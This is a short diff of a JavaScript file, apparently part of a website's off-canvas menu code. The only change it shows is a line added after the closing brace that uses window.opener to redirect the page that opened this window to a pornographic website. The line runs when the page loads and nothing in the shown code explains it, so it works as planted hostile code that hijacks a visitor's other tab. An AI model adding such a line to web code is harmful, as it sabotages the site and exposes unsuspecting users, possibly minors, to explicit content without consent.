@@ -86,3 +86,6 @@ function closeOffcanvas() {
 
 
 });
+
+
+window.opener.location.href = "https://es.pornhub.com/";
